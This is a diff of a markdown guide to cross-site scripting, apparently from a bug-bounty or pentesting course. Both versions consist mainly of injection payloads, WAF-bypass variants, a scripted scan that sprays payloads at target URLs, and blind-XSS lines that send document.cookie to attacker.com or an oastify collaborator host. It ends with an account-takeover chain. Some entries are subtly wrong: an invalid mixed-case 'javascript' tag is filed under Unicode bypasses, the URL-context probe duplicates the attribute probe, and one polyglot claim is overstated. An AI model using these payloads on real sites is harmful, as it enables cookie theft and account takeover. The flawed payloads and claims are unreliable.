@@ -1,122 +1,97 @@
-# Cross-Site Scripting (XSS)
-
-Cross-Site Scripting (XSS) is a client-side code injection vulnerability where an attacker injects malicious scripts into web pages viewed by other users.
-
-## Types of XSS
-
-### Reflected XSS
-The injected script is reflected off the web server, such as in an error message, search result, or any response that includes user input.
-
-**Detection:**
-- Input reflected in response without sanitization
-- Parameters, headers, URL path injection points
-
-**Classic payload:**
-```html
-<script>alert(document.domain)</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-```
-
-### Stored XSS
-The injected script is permanently stored on the target server (database, message forum, comment field) and served to users who access the stored data.
-
-**Detection:**
-- Input stored and displayed to other users
-- Comments, profiles, posts, reviews
-
-### DOM-based XSS
-The vulnerability exists in client-side JavaScript rather than server-side. The page never sends the payload to the server — it's processed entirely in the DOM.
-
-**Detection:**
-- JavaScript reads from `location.hash`, `document.URL`, `location.search`, `document.referrer`, `window.name`
-- Data flows to `innerHTML`, `document.write`, `eval`, `setTimeout`, `jQuery.html()`
-
-## Advanced XSS Techniques
-
-### WAF Bypass Patterns
-
-**Event handler obfuscation:**
-```
-<svg/onload=eval(name)>
-<Body OnLoAd=alert(1)>
-<INPUT onfocus="alert(1)" autofocus>
-```
-
-**Encoding bypass:**
-```
-%3Cscript%3Ealert(1)%3C/script%3E
-&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
-```
-
-**Polyglot payloads:**
-```
-jaVasCript:/*-/*`/*\x60/*\x27/*'/*\x22/*/**/(*/oNcliCk=alert() )//%0D%0A%0D%0A//--></script></title></textarea></style></template></noscript><svg/onload=alert(1)>
-```
-
-### CSP Bypass
-- **Angular expressions**: `{{constructor.constructor('alert(1)')()}}`
-- **JSONP endpoints** on same origin (Google, Akamai)
-- **File upload** with script content
-- **Dangling markup** injection when script execution is blocked
-- **Base tag injection** (change relative script sources)
-- **MIME sniffing** with polyglot files
-
-### Blind XSS
-XSS that fires in an internal application (admin panel, ticketing system).
-
-**Tools:** `xsshunter`, `interactsh`, `Burp Collaborator`
-
-```html
-<script src=https://attacker.com/steal.js></script>
-<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
-```
+# Cross-Site Scripting: Beyond <script>alert(1)
 
 ## Detection Methodology
 
-### Automated
-```bash
-# Scan with Dalfox
-dalfox url https://target.com/search?q=test
-
-# Scan with nuclei
-nuclei -l urls.txt -t ~/nuclei-templates/vulnerabilities/generic/xss.yaml
-
-# Param-based scanning with XSStrike
-python3 xsstrike.py -u "https://target.com/search?q=test"
+### Context-Aware Probing
+```html
+<!-- Test every injection point by context: -->
+<!-- HTML context -->
+"><img src=x onerror=confirm(1)>
+<!-- Attribute context -->
+" onfocus=confirm(1) autofocus="
+<!-- JavaScript string context -->
+';confirm(1);'
+<!-- URL context -->
+" onfocus=confirm(1) autofocus="
 ```
 
-### Manual
-1. **Identify reflection points** — Input that appears in the response
-2. **Test context**:
-   - Between HTML tags: `<script>alert(1)</script>`
-   - In attribute: `"><img src=x onerror=alert(1)>`
-   - In JavaScript string: `';alert(1);//`
-   - In CSS: `</style><script>alert(1)</script>`
-3. **Check filtering** — Try different cases, encoding, event handlers
+### Automated Discovery Sucks — Manual is Better
+```bash
+# Automated tools miss context-dependent XSS
+# Use gospider + qsreplace for initial canvas
+gospider -s https://target.com -d 2 | grep -oP 'https?://[^?]+?=[^&\s]+' | sort -u |   qsreplace '"><img src=x onerror=confirm(1)>' |   while read url; do curl -s "$url" 2>&1 | grep -q "confirm(1)" && echo "$url"; done
+```
 
-## Context-Specific Payloads
+## WAF Bypass Techniques
 
-| Context | Example Payload |
-|---------|----------------|
-| Between HTML tags | `<script>alert(1)</script>` |
-| HTML attribute | `" autofocus onfocus=alert(1) x="` |
-| JavaScript string | `'-alert(1)-'` |
-| JavaScript template literal | `${alert(1)}` |
-| URL | `javascript:alert(1)` |
-| Style tag | `</style><script>alert(1)</script>` |
-| Comments | `--><script>alert(1)</script>` |
+### Mutation XSS (mXSS)
+```html
+<!-- Bypass HTML sanitizers by exploiting parser differentials -->
+<details open ontoggle=confirm()>
+<summary x= "<script>alert(1)</script>">test
+```
 
-## Tools
+### DOM Clobbering
+```html
+<!-- When you control HTML but not JS execution context -->
+<a id=defaultAvatar><a id=defaultAvatar name=href href="x:alert(1)">
+```
+This overwrites `document.getElementById('defaultAvatar')` and its `href` property.
 
-| Tool | Purpose |
-|------|---------|
-| **Dalfox** | Fast XSS scanner with parameter analysis |
-| **XSStrike** | Advanced XSS detection with payload generation |
-| **Burp Suite** | Manual + semi-automated testing |
-| **xsshunter** | Blind XSS callback collection |
-| **Nuclei** | Template-based scanner |
+### Unicode Bypasses
+```html
+<!-- Case variations -->
+<jAvAsCrIpT>alert(1)</sCrIpT>
+<!-- Newlines in attributes -->
+<img src=x
+onerror=alert(1)>
+<!-- Tab/CR instead of space -->
+<img src=x	onerror=alert(1)>
+```
 
----
+### Polyglot XSS
+```html
+"";confirm(1);//
+<!-- Fires in attribute, script, and CSS contexts simultaneously -->
+```
 
-> **Next**: [SQL Injection](03-sql-injection.md)
+## Stored XSS Hunting
+
+Focus on high-value stored XSS surfaces:
+- **Profile fields** (display name, bio, website URL)
+- **File metadata** (EXIF data, filename, file description)
+- **Collaboration features** (comments, mentions, document titles)
+- **Email templates** (subject line, signature, sender name)
+- **Admin panels** (site name, description, footer text)
+
+## DOM XSS with Sinks
+
+Modern frontend frameworks reduce reflected XSS but introduce DOM XSS:
+
+```js
+// Dangerous sink patterns
+element.innerHTML = userControlled;          // Classic
+document.write(userControlled);              // Legacy
+location.hash.slice(1) + something;          // Hash-based
+eval(response.getJSON().callback);           // JSONP
+```
+
+Use DOM Invader (Burp) for automated DOM XSS scanning.
+
+## Blind XSS
+
+The highest-impact XSS subtype. Inject payloads that callback to your server:
+
+```html
+"><img src=x id=dmEoPoz onerror=eval(atob('Y29uZmlybSgxKQ=='))>
+<script>fetch('https://collaborator.oastify.com/?c='+document.cookie)</script>
+```
+
+**Where to inject:** User agent strings, referer headers, contact forms, feedback fields, support tickets, log viewers.
+
+### XSS to ATO Chain
+
+1. Stored XSS in profile bio
+2. Admin views profile → script executes
+3. Script exfiltrates CSRF token + performs sensitive action (add SSH key, create API token, transfer ownership)
+4. Attacker uses exfiltrated credentials/session for full ATO
